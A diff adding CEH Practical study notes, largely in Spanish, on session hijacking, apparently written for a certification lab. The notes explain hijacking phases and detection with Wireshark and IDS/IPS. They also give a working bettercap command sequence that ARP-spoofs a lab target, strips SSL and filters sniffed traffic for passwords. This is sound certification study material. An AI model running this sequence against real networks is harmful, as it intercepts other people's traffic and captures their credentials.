@@ -1,0 +1,66 @@
+CEH Practical Notes
+------------------------------------------
+Modulo 11 - Session Hijacking
+------------------------------------------
+
+# El secuestro de sesiones puede ser activo o pasivo, dependiendo del grado de participación del atacante:
+
+	- Secuestro de sesión activa: un atacante encuentra una sesión activa y la toma.
+	- Secuestro pasivo de sesiones: un atacante secuestra una sesión y, en lugar de tomar el control, monitorea y registra todo el tráfico en esa sesión.
+
+# El secuestro de sesiones se puede dividir en tres fases generales:
+
+	- Seguimiento de la conexión: el atacante utiliza un rastreador de red para realizar un seguimiento de la víctima y el host, o utiliza una herramienta como Nmap para escanear la red en busca de un objetivo con una secuencia TCP que sea fácil de predecir.
+
+	- Desincronización de la conexión: un estado desincronizado ocurre cuando se ha establecido una conexión entre el destino y el host, o es estable sin transmisión de datos, o cuando el número de secuencia del servidor no es igual al número de reconocimiento del cliente (o viceversa).
+
+	- Inyectar el paquete del atacante: una vez que el atacante ha interrumpido la conexión entre el servidor y el objetivo, puede inyectar datos en la red o participar activamente como intermediario, pasando datos entre el objetivo y el servidor, mientras lee e inyecta datos a voluntad.
+
+1.1 - Perform session hijacking
+
+	1.1 - Hijack a session using Zed Attack Proxy (ZAP) or Burpsuite.
+
+	1.2 - Intercept HTTP traffic using bettercap
+
+		># bettercap -iface eth0
+			# -iface : especifica la interfaz a la que enlazar (en este ejemplo, eth0 ).
+
+		># net.probe on
+			# Este módulo enviará diferentes tipos de paquetes de sonda a cada IP en la subred actual para que el módulo net.recon los detecte.
+
+		># net.recon on
+			# Este módulo es responsable de leer periódicamente la tabla ARP del sistema para detectar nuevos hosts en la red. En tiempo real este módulo comenzará a restrear paquetes de red.
+
+		># set http.proxy.sslstrip true
+			# Este módulo permite la eliminación de SSL.
+
+		># set arp.spoof.internal true
+			# Este módulo falsifica las conexiones locales entre las computadoras de la red interna.
+
+		># set arp.spoof.targets 10.10.10.10
+			# Este módulo falsifica la dirección IP del host de destino.
+
+		># http.proxy on
+			# Este módulo inicia el proxy http.
+
+		># arp.spoof on
+			# Este módulo inicia la suplantación de arp.
+
+		># net.sniff  on
+			# Este módulo es responsable de realizar el restreo en la red.
+			
+		># set net.sniff.regexp '.*Password=.*'
+			# Este módulo solo considerará los paquetes enviados con una carga útil que coincida con la expresión regular dada.
+
+
+2 - Detect session hijacking
+
+	# Hay dos métodos principales que se pueden utilizar para detectar el secuestro de sesiones:
+
+		- Método manual: Implica el uso de software de rastreo de paquetes como Wireshark y SteelCentral Packet Analyzer para monitorear los ataques de secuestro de sesiones; El rastreador de paquetes captura los paquetes que se transfieren a través de la red, que luego se analizan utilizando varias herramientas de filtrado.
+
+		- Método automático: Implica el uso de sistemas de detección de intrusiones (IDS) y sistemas de prevención de intrusiones (IPS) para monitorear el tráfico de red entrante; Si un paquete coincide con alguna de las firmas de ataque en la base de datos interna, el IDS genera una alerta y el IPS bloquea el tráfico para que no ingrese a la base de datos.
+
+	2.1 - Detect session hijacking using Wireshark
+
+		# bettercap envía varias solicitudes de difusión ARP a los hosts (o hosts potencialmente activos). Un alto número de solicitudes ARP indica que el sistema en 10.10.10.13 (el sistema del atacante en esta tarea) está actuando como cliente para todas las direcciones IP en la subred, lo que significa que todos los paquetes del nodo víctima (en este caso , 10.10.10.10 ) irá primero al sistema host ( 10.10.10.13 ) y luego a la puerta de enlace. De manera similar, cualquier paquete destinado al nodo víctima se reenvía primero desde la puerta de enlace al sistema host y luego desde el sistema host al nodo víctima.
